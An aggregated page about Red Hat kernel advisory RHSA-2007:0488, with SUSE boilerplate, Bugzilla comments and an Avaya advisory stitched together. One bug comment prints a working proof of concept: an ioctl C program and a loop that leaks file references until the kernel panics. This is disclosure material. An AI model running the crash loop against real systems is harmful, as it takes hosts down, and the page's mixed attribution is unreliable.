## SUSE Security

# A Process That Never Ends

### SUSE is committed to delivering best effort security to its customers and to the Open Source community. We believe that trust in Open Source Software security in general, and the user's privacy in particular, are both indispensable and indefeasible.

We treat software security as a process that never ends. This means we:

* Promptly react to security incidents and deliver premium quality security updates
* Continuously improve the security-related functionality in SUSE products
* Continuously contribute to the rapidly growing maturity of Open Source Software
* Respect the Open Source Software security principles of openness, transparency and traceability

Software security is a complex challenge. Software can provide many of its own security features, such as authentication methods, encryption, intrusion prevention and detection, and backup.

At the same time, it can also contain errors (both deliberate and accidental) that can affect the system's security, including design flaws, programming errors, and backdoors.

The SUSE Security Team addresses all of these aspects of software security, on an ongoing basis. Software security cannot be thought of as a state you can achieve at a specific point in time. Instead, it is a process that must be executed with professional expertise and continuous development. This persistent focus is what has given Open Source Software, Linux and SUSE such an excellent reputation for security.

## Synopsis

Important: kernel security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2007%3A0488)

## Topic

Updated kernel packages that fix several security issues and bugs in the
Red Hat Enterprise Linux 4 kernel are now available.

This security advisory has been rated as having important security impact
by the Red Hat Security Response Team.

## Description

The Linux kernel handles the basic functions of the operating system.

These new kernel packages contain fixes for the security issues described
below:

* a flaw in the connection tracking support for SCTP that allowed a remote

user to cause a denial of service by dereferencing a NULL pointer.
(CVE-2007-2876, Important)

* a flaw in the mount handling routine for 64-bit systems that allowed a

local user to cause denial of service (crash). (CVE-2006-7203, Important)

* a flaw in the IPv4 forwarding base that allowed a local user to cause an

out-of-bounds access. (CVE-2007-2172, Important)

* a flaw in the PPP over Ethernet implementation that allowed a local user

to cause a denial of service (memory consumption) by creating a socket
using connect and then releasing it before the PPPIOCGCHAN ioctl has been
called. (CVE-2007-2525, Important)

* a flaw in the fput ioctl handling of 32-bit applications running on

64-bit platforms that allowed a local user to cause a denial of service
(panic). (CVE-2007-0773, Important)

* a flaw in the NFS locking daemon that allowed a local user to cause

denial of service (deadlock). (CVE-2006-5158, Moderate)

* a flaw in the sysfs\_readdir function that allowed a local user to cause a

denial of service by dereferencing a NULL pointer. (CVE-2007-3104, Moderate)

* a flaw in the core-dump handling that allowed a local user to create core

dumps from unreadable binaries via PT\_INTERP. (CVE-2007-0958, Low)

* a flaw in the Bluetooth subsystem that allowed a local user to trigger an

information leak. (CVE-2007-1353, Low)

In addition, the following bugs were addressed:

* the NFS could recurse on the same spinlock. Also, NFS, under certain

conditions, did not completely clean up Posix locks on a file close,
leading to mount failures.

* the 32bit compatibility didn't return to userspace correct values for the

rt\_sigtimedwait system call.

* the count for unused inodes could be incorrect at times, resulting in

dirty data not being written to disk in a timely manner.

* the cciss driver had an incorrect disk size calculation (off-by-one

error) which prevented disk dumps.

Red Hat would like to thank Ilja van Sprundel and the OpenVZ Linux kernel
team for reporting issues fixed in this erratum.

All Red Hat Enterprise Linux 4 users are advised to upgrade their kernels
to the packages associated with their machine architectures and
configurations as listed in this erratum.

## Solution

Before applying this update, make sure that all previously-released
errata relevant to your system have been applied.

This update is available via Red Hat Network. Details on how to use
the Red Hat Network to apply this update are available at

While this is a simple NULL pointer dereference, it seems to deadlock the NFS lockd and so allows a denial of service attack.   ```  [Comment 1](show_bug.cgi?id=243251#c1)  Jeff Layton    2007-06-08 10:39:24 UTC  ```   *** This bug has been marked as a duplicate of [210128](show_bug.cgi?id=210128) ***   ```  [Comment 2](show_bug.cgi?id=243251#c2)  Jeff Layton    2007-06-08 10:45:34 UTC  ``` My mistake, didn't realize this was on z-stream proposed. Might have been better to clone the other BZ that contains the patch.    ```  [Comment 3](show_bug.cgi?id=243251#c3)  Jason Baron    2007-06-12 15:33:55 UTC  ```  committed in stream rhel‑4.5.z build 55.0.1    ```  [Comment 6](show_bug.cgi?id=243251#c6)  Red Hat Bugzilla    2007-06-25 18:05:03 UTC  ```  An advisory has been issued which should help the problem described in this bug report.

kernel security update (RHSA-2007-0488)

Original Release Date: July 30, 2007

Last Revised: February 25, 2009

Number: ASA-2007-287

Risk Level: Low

Advisory Version: 3.0

Advisory Status: Interim

---

## 1. Overview:

The Linux kernel manages the communication between software and
hardware as
well as the hardware resources of a computer running the Linux operating
system.

Red Hat has issued an updated version of the kernel packages. Below
is a list
of the security issues fixed in the update as reported by Red Hat:

- a flaw in the connection tracking support for SCTP that allowed
  a remote
  user to cause a denial of service by dereferencing a NULL pointer.
- a flaw in the mount handling routine for 64-bit systems that allowed
  a
  local user to cause denial of service (crash).
- a flaw in the IPv4 forwarding base that allowed a local user to
  cause an
  out-of-bounds access.
- a flaw in the PPP over Ethernet implementation that allowed a local
  user
  to cause a denial of service (memory consumption) by creating a socket
  using connect and then releasing it before the PPPIOCGCHAN ioctl has
  been
  called.
- a flaw in the fput ioctl handling of 32-bit applications running on
  64-bit platforms that allowed a local user to cause a denial of service
  (panic).
- a flaw in the NFS locking daemon that allowed a local user to cause
  denial of service (deadlock).
- a flaw in the sysfs\_readdir function that allowed a local user to
  cause a
  denial of service by dereferencing a NULL pointer.
- a flaw in the core-dump handling that allowed a local user to create
  core
  dumps from unreadable binaries via PT\_INTERP.
- a flaw in the Bluetooth subsystem that allowed a local user to
  trigger an
  information leak.

The Common Vulnerabilities and Exposures project (cve.mitre.org) has
assigned
the names
[CVE-2007-2876](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2876),
[CVE-2006-7203](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-7203),
[CVE-2007-2172](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2172),
[CVE-2007-2525](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2525),
[CVE-2007-0773](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0773),
[CVE-2006-5158](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5158),
[CVE-2007-3104](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3104),
[CVE-2007-0958](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0958) and
[CVE-2007-1353](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1353) to these issues.

More information about these vulnerabilities can be found in the
security
advisory issued by RedHat Linux:

* <https://rhn.redhat.com/errata/RHSA-2007-0488.html>

## 2. Avaya System Products with kernel installed:

| Product: | Affected Version(s): | Risk Level: | Actions: |
| --- | --- | --- | --- |
| Avaya Communication Manager | CM 3.1 and CM 4.x | Low | Upgrade to CM 5.0 or later. |
| Avaya Messaging Storage Server | MSS 3.x | Low | Upgrade to MSS 4.0 or later. |
| Avaya Message Networking | All | Low | See recommended actions below.  This issue will be addressed in accordance with [Avaya's Product Security Vulnerability Response Policy](http://support.avaya.com/elmodocs2/security/security_vulnerability_response.pdf) |
| Avaya CCS/SES | SES 3.1.1 or newer | Low | Upgrade to SES 5.0 or later. |
| Avaya AES | AES 4.x | Low | Upgrade to AES 4.2 or later. |

**Recommended Actions:**
For all system products which use
vulnerable
versions of the kernel, Avaya recommends that customers restrict local
and network access to the server. This restriction should be
enforced through the use of physical security, firewalls, ACLs,
VPNs, and other generally-accepted networking practices until such
time as an update becomes available and can be installed.

## 3. Avaya Software-Only Products:

Avaya software-only products operate on general-purpose operating
systems.
Occasionally vulnerabilities may be discovered in the underlying
operating
system or applications that come with the operating system. These
vulnerabilities often do not impact the software-only product directly
but may
threaten the integrity of the underlying platform.

In the case of this advisory Avaya software-only products are not
affected
by the vulnerability directly but the underlying Linux platform may be.
Customers should determine on which Linux operating system the product
was
installed and then follow that vendor's guidance.

## 4. Software-Only Products:

| Product: | Actions: |
| --- | --- |
| CVLAN | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the CVLAN application. The CVLAN application does not require the software described in this advisory. |
| Avaya Integrated Management Suite (IMS) | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the IMS application. The IMS application does not require the software described in this advisory. |

**Recommended Actions:**
In the event that the affected package
is
installed, Avaya recommends that customers follow recommended actions
supplied
by RedHat Linux.

| [Description](show_bug.cgi?id=243252#c0)  Marcel Holtmann    2007-06-08 10:06:03 UTC  ``` SWsoft Virtuozzo/OpenVZ Linux kernel team would like to note that first part of [CVE-2005-3044](https://access.redhat.com/security/cve/CVE-2005-3044) "fput in a 32-bit ioctl on 64-bit x86 systems" is still not fixed in  RHEL4 kernel 2.6.9-42.0.8. As a result local users are able to cause a denial of service.  The following patch fixes this problem in linux mainstream: <http://www.kernel.org/git/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=35311d6478077f7bfe35c1c653193e658bf32686>  The follwong script demonstrates the resource leakage: [vvs@dhcp17-60 ~]$ uname -a Linux dhcp17-60.qa.sw.ru 2.6.9-42.0.8.EL #1 Tue Jan 23 12:34:49 EST 2007 x86_64 x86_64 x86_64 GNU/Linux [vvs@dhcp17-60 ~]$ id uid=500(vvs) gid=500(vvs) groups=500(vvs) context=user_u:system_r:unconfined_t [vvs@dhcp17-60 ~]$ cat tiocgdev.c #include <stdio.h> #include <sys/ioctl.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h>  #define TIOCGDEV        _IOR('T',0x32, unsigned int)  int main(int argc, char *argv[]) {         int fd, ret;          fd = open(argv[0], O_RDONLY);         if (fd < 0) {                 perror("open");                 return 1;         }         ret = ioctl(fd, TIOCGDEV, NULL);         if (ret < 0) {                 perror("ioctl");                 return 1;         }         return 0; } [vvs@dhcp17-60 ~]$ gcc -m32 -o tiocgdev32 tiocgdev.c --static [vvs@dhcp17-60 ~]$ cat /proc/sys/fs/file-nr 528     0       24581 [vvs@dhcp17-60 ~]$ for i in `seq 1 10000` ; do ./tiocgdev32 &>/dev/null ; done [vvs@dhcp17-60 ~]$ cat /proc/sys/fs/file-nr 10452   0       24581  Exploit owerflows the file->f_count and crashes the node:  Unable to handle kernel NULL pointer dereference at 0000000000000038 RIP: <ffffffff80199606>{vfs_getattr+24} PML4 5cf1067 PGD 8765067 PMD 0 Oops: 0000 [1] CPU 0 Modules linked in: md5 ipv6 parport_pc lp parport autofs4 sunrpc ds yenta_socket pcmcia_core ipt_REJECT ipt_state ip_conntrack iptable_filter ip_tables dm_mirror button battery ac uhci_hcd snd_ens1371 snd_rawmidi snd_seq_device snd_pcm_oss snd_mixer_oss snd_pcm snd_timer snd_page_alloc snd_ac97_codec snd soundcore e1000 floppy ext3 jbd dm_mod mptscsih mptsas mptspi mptfc mptscsi mptbase sd_mod scsi_mod Pid: 3753, comm: tiocgdev32 Not tainted 2.6.9-42.0.8.EL RIP: 0010:[<ffffffff80199606>] <ffffffff80199606>{vfs_getattr+24} RSP: 0000:0000010008e69ea8  EFLAGS: 00010206 RAX: ffffffff80449cc0 RBX: 0000000000000000 RCX: 0000010008ec8148 RDX: 0000010008e69ef8 RSI: 0000000000000000 RDI: 0000000000000000 RBP: 0000010008e69ef8 R08: 0000010008ec8140 R09: 00000000ffffd854 R10: 0000010008e68000 R11: 0000000000000000 R12: 0000010008e69ef8 R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000 FS:  0000002a96a2d2a0(0000) GS:ffffffff80545480(0000) knlGS:00000000f7ff58e0 CS:  0010 DS: 002b ES: 002b CR0: 000000008005003b CR2: 0000000000000038 CR3: 0000000000101000 CR4: 00000000000006e0 Process tiocgdev32 (pid: 3753, threadinfo 0000010008e68000, task 0000010009020030) Stack: 0000010008ec8140 000001000929dcc0 00000000fffffff7 0000010008e69ef8        0000000000000000 ffffffff80199738 00000000ffffd7a8 00000000ffffd854        0000000000000000 ffffffff80127e9f Call Trace:<ffffffff80199738>{vfs_fstat+41} <ffffffff80127e9f>{sys32_fstat64+17}        <ffffffff801c2587>{compat_sys_ioctl+906} <ffffffff8018dbbb>{sys_write+69}        <ffffffff80127991>{ia32_sysret+0}  Code: 4c 8b 66 38 ff 90 a0 01 00 00 85 c0 75 6e 49 8b 84 24 70 01 RIP <ffffffff80199606>{vfs_getattr+24} RSP <0000010008e69ea8> CR2: 0000000000000038  <0>Kernel panic - not syncing: Oops   ```  [Comment 1](show_bug.cgi?id=243252#c1)  Eric Sandeen    2007-06-08 16:53:20 UTC  ``` Ok, so this is a dup of [Bug 227978](show_bug.cgi?id=227978) for z-stream?  If so maybe Jeff should take it, since he did the original work in the other bug?  I'm happy to ferry this in for z-stream, but it seems like "his" bug, so I'll give him first carck at it. :)  -Eric   ```  [Comment 2](show_bug.cgi?id=243252#c2)  Eric Sandeen    2007-06-08 17:25:29 UTC  ``` Talked with Jeff... over to him since he did the original work.  -Eric   ```  [Comment 5](show_bug.cgi?id=243252#c5)  Jason Baron    2007-06-12 15:35:07 UTC  ``` committed in stream rhel‑4.5.z build 55.0.1    ```  [Comment 8](show_bug.cgi?id=243252#c8)  Red Hat Bugzilla    2007-06-25 18:05:13 UTC  ```  An advisory has been issued which should help the problem described in this bug report.
